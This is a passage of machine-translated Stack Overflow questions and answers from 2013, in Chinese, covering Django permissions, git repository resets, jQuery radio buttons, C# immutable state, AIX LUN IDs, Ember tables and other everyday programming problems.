{% endif %} 
```

另一种变体（如果您想在视图中执行所有逻辑）是创建一个 mixin：

```
class CanEditMixin(object):
    def get_context_data(self, **kwargs):
        """
        The method populates Context with can_edit var
        """
        # Call the base implementation first to get a context
        context = super(CanEditMixin, self).get_context_data(**kwargs)
        #Update Context with the can_edit
        #Your logic goes here (something like that)
        if self.request.user == self.get_object().author
            context['can_edit']=True
        else:
            context['can_edit']=False
        return context 
```

然后你需要更新你的视图（顺序很重要）：

```
class PostDetailView(CanEditMixin, LoginRequiredMixin, DetailView):
    #your view 
```

和你的模板：

```
{% if can_edit %}
    display edit button
{% else %}
    display view button or something else
{% endif %} 
```

此外，根据您的问题的具体情况，您可能对[django object-level permission packages](https://www.djangopackages.com/grids/g/perms/)感兴趣。这些包允许您为用户添加编辑给定对象的权限。在这种情况下，您可以在模板中写下类似的内容：

```
{% if perms.post.can_edit %}
    display edit button
{% else %}
    display view button or something else
{% endif %} 
```

[django 文档](https://docs.djangoproject.com/en/dev/topics/auth/default/#permissions)的链接。

# apache - 如何避免 Http Mail 服务器中的钓鱼和 DOS 攻击

> ID：15244624
> 
> 赞同：0
> 
> 时间：2013-03-06T10:21:20.320
> 
> 标签：apache, centos

我们在 Centos 中运行一个 http 邮件服务器，几天前它被黑客攻击并用于从其他第三方 Web 服务器中获取详细信息，主要问题是，那些被盗的详细信息已存储到我们的邮件服务器中，现在已被识别并服务器宕机。但是怎么可能呢，是否需要在操作系统防火墙中进行主要配置，或者Apache服务器是否有可用的功能以避免被黑客使用。请协助。

# python - 在python中定义属性的正确方法是什么

> ID：15244626
> 
> 赞同：1
> 
> 时间：2013-03-06T10:21:21.990
> 
> 标签：python, class, attributes

有什么不同

```
class d():
    d = None
    def __init__(self):
        ..... 
```

和：

```
class d():
   def __init__(self):
       self.d = None 
```

# java - 取消编组后未设置子级与父级的关系

> ID：15244629
> 
> 赞同：0
> 
> 时间：2013-03-06T10:21:36.547
> 
> 标签：java, jpa, jersey, eclipselink

我有一个 Order 对象，其中包含 Orderline 对象的集合。

命令：

```
@XmlRootElement
public class Order implements Serializable{
.....
@OneToMany(cascade = CascadeType.ALL, mappedBy = "order")
private List<Orderline> orderlineCollection; 
```

订单线：

```
@XmlRootElement
public class Orderline implements Serializable{
.....
@JoinColumn(name = "order_id", referencedColumnName = "id")
@ManyToOne(optional = false)
private Order order; 
```

订单对象通过 XML 从不同的应用程序发送。起初我得到一个异常，order_id 不能为空，所以我认为 orderline 是在 order 对象之前保存的。

但是经过一番搜索后，我发现（似乎）在将 xml 转换为对象时，没有设置从 orderline 到 order 的关系。Tho Order 确实有订单线。所以要解决这个问题，我现在必须循环排序 orderline 集合并设置顺序。

```
for(Orderline line : order.getOrderlineCollection()){
    line.setOrder(order);
} 
```

虽然这解决了我的问题，但对可能所有的关系都这样做并不合适。这是正常行为吗？我应该以不同的方式解决这个问题吗？

# django - 我如何在我的系统中安装 django 商店，遇到诸如“没有名为 setuptools 的模块”之类的错误

> ID：15244631
> 
> 赞同：0
> 
> 时间：2013-03-06T10:21:38.597
> 
> 标签：django

我正在尝试使用 django 商店
，但它向我显示“没有模块 setuptool”，而我即将通过命令提示符安装 django 商店
将请指导某人......！

这是我的错误：

```
C:\django-shop>python setup.py install
Traceback (most recent call last):
File "setup.py", line 1, in <module>
from setuptools import setup, find_packages
ImportError: No module named setuptools 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:42:11.370

我认为您的问题的答案可能是，您没有安装 setuptools 吗？

我认为 setuptools 是 python 库的扩展

您可以使用此链接安装它

[https://pypi.python.org/pypi/setuptools](https://pypi.python.org/pypi/setuptools)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:56:54.163

我建议使用[virtualenv](https://pypi.python.org/pypi/virtualenv)来保持干净和简单。

一旦你开始运行，installin django-shop 应该是这样的：

```
pip install django-shop 
```

还要检查 pip 的要求文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:59:47.407

每次您安装应用程序时尝试搜索他们的文档，它都会回答您的问题。

django-shop 的文档：

[https://django-shop.readthedocs.org/en/latest/tutorial.html](https://django-shop.readthedocs.org/en/latest/tutorial.html)

# android - Android小部件动态添加渐变到背景

> ID：15244634
> 
> 赞同：2
> 
> 时间：2013-03-06T10:21:42.637
> 
> 标签：android

我需要向我的 View 添加渐变`ImageView`。我只是在使用这段代码：

```
 ShapeDrawable sd = new ShapeDrawable(new RectShape());
    sd.getPaint().setShader(new LinearGradient(0, 0, 0, 300, color, color, Shader.TileMode.REPEAT));

    mUpdateViews.setImageViewBitmap(R.id.imageview, ((BitmapDrawable)sd).getBitmap()); 
```

但问题是：

> “无法从 ShapeDrawable 转换为 BitmapDrawable”

是否可以从代码加载渐变，而不是从 XML 加载？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:32:03.423

您不能投射`ShapeDrawable`到`BitmapDrawable`：

```
java.lang.Object
   ↳ android.graphics.drawable.Drawable
       ↳ android.graphics.drawable.ShapeDrawable 
```

对比

```
java.lang.Object
   ↳ android.graphics.drawable.Drawable
       ↳ android.graphics.drawable.BitmapDrawable 
```

所以你只能转换为 Drawable ，因为这是这两个类共享的唯一（除了 Object ）通用功能。

> 是否可以从代码加载渐变，而不是从 XML 加载？

如果“加载”是指创建，那么有很多`createFrom...()`方法，但目前您可能希望坚持使用 XML 以获得更好的灵活性。

# storage - 在 AIX 中使用 lsattr 解释 LUN id 和 Target id

> ID：15244643
> 
> 赞同：0
> 
> 时间：2013-03-06T10:21:56.250
> 
> 标签：storage, aix, scsi

我对 AIX 很陌生，我在 AIX 中发现了一个命令 lsattr，它有助于获取设备的 SCSI id 和 LUN id。我无法理解如何解释 SCSI id 和 LUN id 的值。这是一个示例输出：

```
 bash-4.2# lsattr -El hdisk693
.......
lun_id        0x25f000000000000             Logical Unit Number ID           False
scsi_id       0x21300                       SCSI ID                          False
....... 
```

我跳过了不相关的行。

1) **LUN id 是 0x25f000000000000 ，这是巨大的**，在一些博客中读到我们必须将它右移 48 位才能得到实际值，这是在哪里记录的？

2) 还有**SCSI id 呢，即使这个值看起来很大，0x21300**

有人可以帮我吗？

感谢和问候，

阿伦·维贾普尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-26T16:10:06.443

LUN 为 8 个字节。有 4 种形式，这些形式以 LUN 的高 2 位给出。当人们说将其右移 48 位时，那是因为他们假设您的 LUN 是“单级 LUN 结构”。

它变得相对复杂。参见 sam5r14.pdf，第 4.7 节。您可以在此处获取所有 SCSI 规范：[http](http://www.t10.org/drafts.htm) ://www.t10.org/drafts.htm 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-08T23:08:44.480

这是我的可读形式的答案。请参阅我上面的评论以获取更多信息。

```
typedef struct scsi_long_lun_t

{

   union
   {

      struct
      {

         // Method 0 - Peripheral Device Addressing Method (8 bit LUN)

         // |        7-6        |            5-0            |
         // +-------------------+---------------------------+
         // |Address Method(00b)|    Bus Identifier (00h)   |
         // +-----------------------------------------------+
         // |       Single Level LUN (00h to FFh)           |
         // +-------------------+---------------------------+
         byte   MethodAndBus;
         byte   Lun8;
         byte   Reserved[6];
      } Method0;

      struct
      {
         //  Method 1 - Flat Space Addressing Method (14 bit LUN)

         // |        7-6        |            5-0            |
         // +-------------------+---------------------------+
         // |Address Method(01b)|   High Flat Space LUN     |
         // +-----------------------------------------------+
         // |      Flat Space LUN (0000h to 3FFFh)          |
         // +-------------------+---------------------------+
         byte   MethodAndHighLun;
         byte   LowLun;
         byte   Reserved[6];
      } Method1;

      struct
      {
         //  Method 2 - Logical Unit Addressing Method

         // |        7-6        |            5-0            |
         // +-------------------+---------------------------+
         // |Address Method(10b)|          Target           |
         // +-----------------------------------------------+
         // |     Bus (7-5)        |       LUN (4-0)        |
         // +-------------------+---------------------------+
         byte   MethodAndTarget;
         byte   BusAndLun[7];
      } Method2;

      struct
      {

         //  Method 3 - Extended Logical Unit Addressing

         // |        7-6        |  5-4    |      3-0         |
         // +-------------------+----------------------------+
         // |Address Method(11b)| Length  |Extended Addr Meth|
         // +------------------------------------------------+
         // |  Extended address method specific (7 bytes)    |
         // +------------------------------------------------+
         byte  MethodEtc;
         byte  MethodSpecific[7];
      } Method3;

   } u;

} scsi_long_lun_t; 
```

# git - 如何重新启动 git 存储库

> ID：15244644
> 
> 赞同：13
> 
> 时间：2013-03-06T10:21:57.253
> 
> 标签：git, github, github-for-windows

我是 git 的新手——刚刚意识到对 .gitignore 的更改不会“追溯地”针对 repo 进行处理——而是会影响未来的 'git add *' 命令等。一旦文件在 repo 中——它们必须被手动删除。

在这一点上——我想完全杀死这个 repo——然后重新开始（保存我的配置等）。

这很容易实现还是会导致重大问题？可以备份——然后删除 .git 文件夹——然后重新开始吗？

另外——对于刚开始使用 git 的其他新手，我建议观看此视频。它描述的不是如何使用 git——而是 git 如何在内部工作——我发现它大开眼界。它的标题是 git 4 岁及以上。 [http://blip.tv/open-source-developers-conference/git-for-ages-4-and-up-4460524](http://blip.tv/open-source-developers-conference/git-for-ages-4-and-up-4460524)

**解析度：**

我要感谢大家的意见和指导。

我确实尝试删除 .git 目录 - 并重新启动。我不确定如何——但当我尝试重新开始时——它开始时完全了解它的历史——简而言之，它重新创建了自己以包含所有以前的提交和跟踪。

我不理会这件事——着手进行重组、重组和清理。更改文件夹结构 - 删除不必要的项目、文件夹等。 - 并在此过程中 - 意识到我可以做些什么来删除我不想跟踪的文件（但仍然希望它们出现在树中）。

我有效地移动了每个文件夹等，当我提交这个时 - git 删除了对移动/删除文件的跟踪。但是由于我现在拥有的 .gitignore - 它没有拾取或跟踪移动文件夹中的文件。

我所做的大部分工作都是为开始一个全新的 git 存储库做准备。在这个过程的后期，我并没有意识到——我不想跟踪的大部分内容已经被有效地删除以用于回购。所以采取了发生的事情 - 并进行了更多调整 - 现在一切都很好。

再一次 - 谢谢你。我爱吉特！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-06T12:57:09.003

我一直这样做。进入工作目录，如果你在 linux 或 mac 上做一个

```
rm -rf .git 
```

然后我做一个

```
git init
git add .
git commit -m "first time load" 
```

这就是你所需要的

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-03-06T10:43:00.967

> 可以备份——然后删除 .git 文件夹——然后重新开始吗？

是的。这就是它的全部。

一些非常奇特的设置可能在工作目录之外有 .git 文件夹；但除此之外，.git 文件夹包含 git 中的所有信息。如果您删除它，您将删除所有历史记录、git-metadata 等。

如果你有遥控器，它们的链接就会丢失，因为它存储在同一个 .git 文件夹中。远程本身，比如说你的 Gitlab 服务器，显然没有消失。因此，如果您在干净的环境中重新添加相同的遥控器，它将导致历史重新出现，这可能会导致合并冲突。

编辑：对于那些可能没有阅读整个问题的人：**警告：这将删除您的所有 git 历史记录**。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-06T10:46:20.457

处理此问题的最佳策略是使用该`git archive`命令。这将在 tar 存档中导出树的未版本化版本。选择要导出的分支并在存储库中运行以下命令：

```
git archive master | tar -x -C ~/target/directory 
```

然后，您可以干净地删除您的存储库文件夹，然后提取您的存档以重新开始。最后，您可以在提取的文件夹中创建一个新的存储库，如下所示：

```
git init 
```

# javascript - 在选择单选按钮时隐藏/显示 div

> ID：15244663
> 
> 赞同：2
> 
> 时间：2013-03-06T10:22:46.363
> 
> 标签：javascript, jquery

这是我的 html 代码

```
<div class="wrapper"> <strong>Space portion</strong>

<br />
<input type="radio" name="rdSpace" value="RJ" />Space 1
<br />
<input type="radio" name="rdSpace" value="SM" />Space 2
<br />
<br />
</div>
<div class="wrapper"> <strong> Template</strong>

<br />
<input type="radio" name="rdTemplate" value="uploadTemplate" />Upload your own file
<label class="cabinet">
    <input style="margin-left:10px;" type="file" name="user_upload_template"
    class="uploader" id="file">
    <br />
    <input type="radio" name="rdTemplate" value="preExisting" />Choose below
    <div id="RJ" class="tempDisp">Div 1 Preview</div>
    <div id="SM" class="tempDisp">Div 2 Preview</div> 
```

这是jQuery代码

```
$(document).ready(function () {
$("div.tempDisp").hide();
$('[id="' + $(":radio:checked").val() + '"]').show();
$('input[name="rdSpace"]:radio,input[name="rdTemplate"]').click(function () {
    $("div.tempDisp").fadeOut('slow');
    $('[id="' + $(this).val() + '"]').fadeIn('slow');
});
}); 
```

jquery 代码的目的是在选择“Space 1”收音机时显示“Div 1 Preview”并在选择“Space 2”收音机时显示“Div 2 Preview”.. 到目前为止它工作正常

现在我尝试在选择“上传您自己的文件”单选时添加隐藏“Div 1 预览”和“Div 2 预览”的功能。我成功了，并且选择了隐藏的按钮。但问题是当我单击返回“选择下方”单选时，它们没有显示回来。为什么？

这是小提琴 [http://jsfiddle.net/bTM66/](http://jsfiddle.net/bTM66/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:37:08.047

试试这个：

```
$(document).ready(function () {
    $("div.tempDisp").hide();
    $('[id="' + $(":radio:checked").val() + '"]').show();
    $('input[name="rdSpace"]:radio,input[name="rdTemplate"]').change(function () {
        $("div.tempDisp").fadeOut('slow');
        if ($(this).val() === "preExisting") {
            $(":radio:checked:first").change();
        } else {
            if(!$('input[value="uploadTemplate"]').is(':checked')){
            $('[id="' + $(this).val() + '"]').fadeIn('slow');
          }
        }
    });
}); 
```

见**[样品小提琴](http://jsfiddle.net/QFbNZ/2/)**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:33:59.193

因此，要根据两个单独的值显示两个 div 中的一个或不显示。

click 事件绑定到两组单选按钮，因此您不能使用`$(this)`获取选中的单选按钮的值来选择要显示的 ID，您需要通过其名称指定它来自哪个单选按钮选择。

您还需要检查哪些其他选择（浏览器/选择）被选中并显示或不显示。

并使用更改而不是单击，这样您就不会得到不必要的淡出/淡入。

而且我会添加`style="display:none"`到 div .tempDisp 以便它们在没有 js 的情况下在加载时已经隐藏。

[工作jsfiddle](http://jsfiddle.net/bTM66/8/)

```
$(document).ready(function () {

    $('input[name="rdSpace"]:radio,input[name="rdTemplate"]').on('change', function () {
        $("div.tempDisp").fadeOut('slow');
        if ($('input[name="rdTemplate"]:checked').val()=='preExisting'){
            $('[id="' + $('input[name="rdSpace"]:checked').val() + '"]').fadeIn('slow');
        }
    })
}); 
```

将此设置为选中，以便用户更改第一个选择时可以决定显示。

```
<input type="radio" name="rdTemplate" value="preExisting" checked="checked" /> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T10:35:21.847

**你的代码在做什么..**

`$('input[name="rdSpace"]:radio,input[name="rdTemplate"]').click(function () {`== 单击时，在带有给定选择器的收音机上

`$("div.tempDisp").fadeOut('slow');`== div 类 tempDisp 淡出缓慢

`$('[id="' + $(this).val() + '"]').fadeIn('slow');`== 带有 id 的 div (selected radio val) show

**问题**

单击`Upload your own file`当前值是`uploadTemplate`，jquery 将无法找到带有`id = uploadTemplate`. 所以什么也没有发生。

onclick `Choose below`同样的事情.. 当前值是`preExisting`并且它不会再次找到带有 . 的 div `id=preExisting`。所以什么都不会再发生

**周围的工作**

```
 $(document).ready(function () {
   $("div.tempDisp").hide();
   $('[id="' + $(":radio:checked").val() + '"]').show();
   $('input[name="rdSpace"]:radio,input[name="rdTemplate"]').click(function () {
      $("div.tempDisp").fadeOut('slow');
      $('[id="' + $(this).val() + '"]').fadeIn('slow');
      if($(this).val()=="preExisting"){ //here check if value is preExistig
         $('#'+ $('input[name="rdSpace"]:checked').val()).fadeIn('slow');
         //$('#RJ,#SM').fadeIn('slow');  //if yes show the div you wanted which is RJ,SM
      }
   });
}); 
```

**更新**

代替

```
 $('#RJ,#SM').fadeIn('slow'); 
```

和

```
 $('#'+ $('input[name="rdSpace"]:checked').val()).fadeIn('slow'); 
```

[更新的工作小提琴](http://jsfiddle.net/bipen/bTM66/9/)

# c# - 正确建模表示状态突变的不可变数据结构

> ID：15244666
> 
> 赞同：1
> 
> 时间：2013-03-06T10:22:56.423
> 
> 标签：c#, design-patterns, immutability

我特别玩了*不可变*和*突变*的词来突出这个问题。

我想设计一个抽象来模拟状态转换并收集相关数据（也许这两个要求违反了**单一职责**？）。

我会画出类似的东西：

```
enum StateTypeEnum
{
    State1,
    State2,
    State3
}

class State
{
    private readonly StateTypeEnum _stateType;
    private readonly IEnumerable<string> _stateData;

    public State(StateTypeEnum stateType)
    {
        _stateType = stateType;
        _stateData = new List<string>(new string[] { });
    }

    public State(StateTypeEnum stateType, IEnumerable<string> stateData)
    {
        _stateType = stateType;
        _stateData = new List<string>(stateData);
    }

    public State ChangeState(StateTypeEnum stateType)
    {
        return new State(stateType, _stateData);
    }

    public State ChangeState(StateTypeEnum stateType, IEnumerable<string> stateData)
    {
        return new State(stateType, _stateData.Concat(stateData));
    }

    public State ChangeState(IEnumerable<string> stateData)
    {
        return new State(_stateType, _stateData.Concat(stateData));
    }

    public IReadOnlyList<string> StateData
    {
        get
        {
            return new ReadOnlyCollection<string>(_stateData.ToList());
        }
    }

    public StateTypeEnum CurrentStateType
    {
        get
        {
            return _stateType;
        }
    }
} 
```

并将其用作：

```
var state1 = new State(StateTypeEnum.State1);
var state2 = state1.ChangeState(StateTypeEnum.State3);
var state3 = state2.ChangeState(new[] { "a", "b", "c" });
var state4 = state3.ChangeState(StateTypeEnum.State1, new[] { "d", "e" });
var state5 = state4.ChangeState(StateTypeEnum.State3);

Debug.Assert(
    state5.CurrentStateType == StateTypeEnum.State3);
Debug.Assert(
    state5.StateData.SequenceEqual(new[] { "a", "b", "c", "d", "e" })); 
```

从[上一个问题](https://stackoverflow.com/questions/15112880/guidelines-to-design-a-c-sharp-library-well-usable-from-f)我知道我可以使用 .NET[不可变集合](http://blogs.msdn.com/b/bclteam/archive/2012/12/18/preview-of-immutable-collections-released-on-nuget.aspx)。

但这不是我的问题的核心，我想知道这样的设计是否会导致不可变数据结构的正确（或可接受）实现，该结构模型状态与相关数据的转换。

**替代实现：**

我可以删除枚举并定义 State 的子类型吗？

```
class State {

  public StateTransition1 ChangeToTransition1() {
    return new StateTransition1( ... );
  }

  public StateTransition2 ChangeToTransition2(IEnumerable data) {
    return new StateTransition2( ... );
  }
} 
```

通过这种方式，我清楚地将transition1 作为定义明确的特定含义，将transition2 作为它自己的含义（例如，它包含特定的关联数据）。

然后消费者代码可以查询子类型类型而不是枚举来控制流程。

**正确考虑状态变化方法：**

由于使用构造函数重新创建状态，我想知道分解（``ChangeToXXXX`）是否将状态方法更改为扩展方法可以导致更可维护和更正式的正确设计。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:29:11.363

如果您需要保证s`State`是不可变的，您应该考虑**密封**该类`State`，这将只允许通过该唯一类公开的方法进行状态转换（到新的不可变状态），保持`enum`s 就像您目前所做的一样. 在这种情况下，使用扩展方法在功能上是等效的，因为您保持实现密封。

如果您想将其重构为“OOP 样式”并且不关心这是否会使您接触到可能的可变实现，那么您可以使用[“用子类替换类型代码”](http://sourcemaking.com/refactoring/replace-type-code-with-subclasses)重构以得到类似的结果：

```
interface IState
{
    IEnumerable<string> Data { get; }
}

class State1 : IState 
{  ...  }

class State2 : IState 
{  ...  }

class State3 : IState 
{  ...  } 
```

在这种情况下，您可以在`IState`接口上使用扩展方法，但这意味着转换逻辑必须与实际状态完全分离。

或者，您可以让`IState`接口实现一个`GetNextState(someInput)`方法，然后让每个状态决定下一个状态。

或者，您可以拥有一个带有`internal abstract`成员的抽象基类，以防止其他程序集从它们派生。

如果没有额外的背景，很难准确判断哪种情况最适合您的应用程序。例如，不清楚这些枚举的目的是什么，因为它们似乎不参与有关转换的决定。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-03-06T10:52:08.370

也许这样的模式会有所[帮助](http://en.wikipedia.org/wiki/State_pattern)

# ios - http://m.bing.com/directions 参数？

> ID：15244669
> 
> 赞同：1
> 
> 时间：2013-03-06T10:23:01.783
> 
> 标签：ios, bing-maps

[大家好，我需要知道如何在http://m.bing.com/directions](http://m.bing.com/directions)中传递两点（经度和纬度）？绘制路线并向用户显示行车路线。

我通过反复试验找到了一个解决方案，这是生成的 URL： http://m.bing.com/directions?IIG=acc63aafc7ac4348b2fa7662d871504a&kval=3.1&appns=mSERP&cutc=1362555191520#/Maps?q= [37.332333,-122.031219,, ,,current%20location~42.983391,-81.233040,,,,current%20location&ul=&mode=1&autoredirect=0](http://m.bing.com/directions?IIG=acc63aafc7ac4348b2fa7662d871504a&kval=3.1&appns=mSERP&cutc=1362555191520#/Maps?q=37.332333,-122.031219,,,,current%20location~42.983391,-81.233040,,,,current%20location&ul=&mode=1&autoredirect=0)

我正在将它从我的应用程序传递到 Safari 移动设备。

我需要知道传递两点的正确方法，以及是否有其他参数（如果有）。

我用谷歌搜索了好几个小时，但没有解决任何问题。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:38:31.523

您可能可以使用与 bing 地图门户相同的参数，请参阅此处的文档，如果用户使用的是移动平台，则应将他重定向到移动版本：

[http://onlinehelp.microsoft.com/en-us/bing/ff808440.aspx](http://onlinehelp.microsoft.com/en-us/bing/ff808440.aspx)

这也是 Alastair 在他的博客上发表的一篇有趣的文章：

[http://alastaira.wordpress.com/2012/06/19/url-parameters-for-the-bing-maps-website/](http://alastaira.wordpress.com/2012/06/19/url-parameters-for-the-bing-maps-website/)

# c# - DataTemplate 中的 WPF Xaml 访问自定义控件

> ID：15244670
> 
> 赞同：0
> 
> 时间：2013-03-06T10:23:04.053
> 
> 标签：c#, wpf, datatemplate

我在 DataTemplate 中有一个自定义控件“AutoCompleteTextBox”，如下所示：

```
<DataGridTextColumn.HeaderTemplate>
  <DataTemplate>
    <StackPanel Orientation="Vertical">
        <TextBlock
                                Text="{Binding Content, RelativeSource={RelativeSource Mode=TemplatedParent}}"
                                Margin="5" />

        <Border DockPanel.Dock="Top"
                                    HorizontalAlignment="Left"
                                    VerticalAlignment="Center"
                                    Padding="2">

            <uc:AutoCompleteTextBox x:Name="AutoTextBox" />

        </Border>
    </StackPanel>
  </DataTemplate>
</DataGridTextColumn.HeaderTemplate> 
```

我如何`AutoTextBox`在后面的代码中访问？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T11:09:10.967

不能直接按名称访问 DataTemplate 中的控件！但是您可以尝试使用 VisualTree ...

```
DependencyObject dgColumnHeader = GetYourColumnHeader();
var yourAutoCompleteTextBox = FindVisualChild<AutoCompleteTextBox>(dgColumnHeader);

public static T FindVisualChild<T>(DependencyObject parent) where T : DependencyObject
{
    for (int i = 0; i < VisualTreeHelper.GetChildrenCount(parent); i++)
    {
        DependencyObject child = VisualTreeHelper.GetChild(parent, i);
        if (child != null && child is T)
            return (T)child;
        else
        {
            T childOfChild = FindVisualChild<T>(child);
            if (childOfChild != null)
                return childOfChild;
        }
    }
    return null;
} 
```

# model-view-controller - 没有由 embertable 呈现的行，但显示了列

> ID：15244672
> 
> 赞同：0
> 
> 时间：2013-03-06T10:23:07.830
> 
> 标签：model-view-controller, ember.js, ember-table

我正在使用最新的 ember 和 embertable。尝试使用页面中的示例并将其重写以在我的 MVC 项目中使用。问题是行不会显示，但列会显示。

这是新ember版本的问题吗？

编辑：在此处提供更多信息。

HTML

```
 <script type="text/x-handlebars" data-template-name="application">
          <div class='presentation-container'>
            {{view Ember.Table.TablesContainer controllerBinding="tableController"}}
          </div>
        </script> 
```

输出（无行=/）

> 日期输入 低开 成交量 高 收盘

员工任务控制器

```
App.EmployeetasksController = Ember.Controller.extend({
    tableController: Ember.computed(function () {
        return Ember.get('App.EmployeetasksController.TableController').create();
    }).property() });

App.EmployeetasksController.LazyDataSource = Ember.ArrayProxy.extend({
    init: function () {
        console.log('EmployeetasksController.LazyDataSource init');
      enter code here  this._super();
    },
    objectAt: function (idx) {
        console.log("Lager rad");
        var date, row;
        row = this.get('content')[idx];
        if (row) {
            return row;
        }
        date = new Date();
        date.setDate(date.getDate() + idx);
        row = {
            index: idx,
            date: date,
            open: Math.random() * 100 - 50,
            high: Math.random() * 100 - 50,
            low: Math.random() * 100 - 50,
            close: Math.random() * 100 - 50,
            volume: Math.random() * 1000000
        };
        this.get('content')[idx] = row;
        return row;
    }, });

App.EmployeetasksController.TableController = Ember.Table.TableController.extend({
    init: function () {
        console.log('EmployeetasksController.TableController init');
        this._super();
    },
    hasHeader: true,
    hasFooter: true,
    numFixedColumns: 0,
    numRows: 500000,
    rowHeight: 30,
    columns: Ember.computed(function () {
        var columnNames, columns, dateColumn, entryColumn;
        columnNames = ['open', 'high', 'low', 'close', 'volume'];
        entryColumn = Ember.Table.ColumnDefinition.create({
            columnWidth: 100,
            headerCellName: 'Entry',
            contentPath: 'index'
        });
        dateColumn = Ember.Table.ColumnDefinition.create({
            columnWidth: 150,
            headerCellName: 'Date',
            getCellContent: function (row) {
                return row['date'].toDateString();
            }
        });
        columns = columnNames.map(function (key, index) {
            var name;
            name = key.charAt(0).toUpperCase() + key.slice(1);
            return Ember.Table.ColumnDefinition.create({
                columnWidth: 100,
                headerCellName: name,
                getCellContent: function (row) {
                    return row[key].toFixed(2);
                }
            });
        });
        columns.unshift(dateColumn);
        columns.unshift(entryColumn);
        return columns;
    }).property(),
    content: Ember.computed(function () {
        console.log("Lager array");
        return App.EmployeetasksController.LazyDataSource.create({
            content: new Array(this.get('numRows'))
        });
    }).property('numRows') }); 
```

风景

```
App.EmployeetasksView = Ember.View.extend({
    classNames: 'ember-app',
    templateName: 'employeetasks'
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T15:06:14.623

过时的余烬和车把修复了它。

# grails-plugin - Grails Resources Plugin 资源范围

> ID：15244674
> 
> 赞同：0
> 
> 时间：2013-03-06T10:23:16.583
> 
> 标签：grails-plugin

我正在努力理解使用 Grails 资源插件定义的资源范围。

我创建了一个小项目（Grails 2.0.4），其中包含一个 Book 域项，并生成了相关的控制器和视图。

然后我修改了主要布局如下：

```
<html>
 <head>
  <g:layoutTitle/>
  <r:layoutResources/>
 </head>
 <body>
  <g:layoutBody/>
  <r:layoutResources/>
 </body>
</html> 
```

当我运行应用程序时，我没有得到预期的样式。

我现在将以下内容添加到头部 list.gsp

```
<head>
  <meta name="layout" content="main"/>
  <r:require modules="jquery-mobile"/>
</head> 
```

现在，当我转到列表页面时，我按预期正确地获得了 jquery-mobile 样式，但是当我转到创建页面时，我也得到了 jquery-mobile 样式，但期望没有样式，因为此页面不包含标记。

似乎为一个页面选择的资源正在用于所有其他页面。这是预期的行为吗？

谢谢，金

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T12:01:25.930

使用 Resources 1.2，听起来这可能是一个老错误。

# php - 在学说2中从yml或xml文件创建模型类

> ID：15244683
> 
> 赞同：2
> 
> 时间：2013-03-06T10:23:49.297
> 
> 标签：php, doctrine-orm

我已经使用 ORM Designer 为学说 2 创建了 yml 和 xml 文件，但不知道如何从中创建模型类。在学说 1 中，我在 php 文件中使用以下命令来生成相同的命令：

> Doctrine_Core::generateModelsFromYaml(realpath("../application/configs/schema.yml"), realpath('../application/models'), array('generateTableClasses' => true));

如果有人能说明这一点，他/她将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T11:21:38.910

您可以为此使用 CLI。

```
doctrine orm:generate-entities /path/to/entities 
```

有关详细信息，请参阅[手册](http://docs.doctrine-project.org/en/2.0.x/reference/tools.html#entity-generation)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-08T04:57:50.960

我找到了生成“实体类模型”的更好和理想的工具。您不需要使用 CLI 创建模型类。

为此使用以下 ORM 设计器：Doctrine ORM Designer 2.1.9.69

它提供了创建 PHP 模型类的选项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T06:02:45.503

请尝试使用“php messenger-cli.php orm:generate-entities models”来生成实体类，“php tutorial-cli.php orm:generate-proxies”来生成代理类，“php tutorial-cli.php orm:generate-”存储库模型'来生成自定义 entityRepository 类。为此，您必须在应用程序的根目录中拥有您的学说-cli.php。

# eclipse - 是否可以使用 struts-el 1.2.9 为 websphere 8.5 部署创建动态 web 3.0

> ID：15244685
> 
> 赞同：1
> 
> 时间：2013-03-06T10:24:00.107
> 
> 标签：eclipse, jakarta-ee, websphere, struts-1, ibm-rad

正如问题所暗示的那样。在 RAD/eclipse 中使用动态 web 3.0 项目与要部署在 websphere 8.5.1 中的库 struts 1.2.9 时会不会有任何冲突？原因是我正在使用 struts 1.1 从 websphere 5.1 迁移，但想知道我是否会如果我进行此迁移，会遇到任何困难。

干杯。

我收到以下错误：

> javax.servlet.jsp.JspException：在 org.apache.struts.taglib.html.JavascriptValidatorTag.renderJavascript(JavascriptValidatorTag.java:384) 在 org.apache.struts.taglib 的语言环境“en_US”中的“SAChangeSecretQAsFormBean”下找不到表单。 com.ibm._jsp._SA_5F_SecretQuestions._jspx_meth_html$1el_javascript_0(_SA_5F_SecretQuestions.java: 304) 在 com.ibm._jsp._SA_5F_SecretQuestions._jspService(_SA_5F_SecretQuestions.java:140) 在 com.ibm.ws.jsp.runtime.HttpJspBase.service(HttpJspBase.java:99) 在 javax.servlet.http.HttpServlet.service (HttpServlet.java:668) 在 com.ibm.ws.webcontainer.servlet.ServletWrapper。com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:774) 处的服务(ServletWrapper.java:1224) com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:456)在 com.ibm.ws.webcontainer.servlet.ServletWrapperImpl.handleRequest(ServletWrapperImpl.java:178) 在 com.ibm.wsspi.webcontainer.servlet.GenericServletWrapper.handleRequest(GenericServletWrapper.java:122) 在 com.ibm.ws.jsp 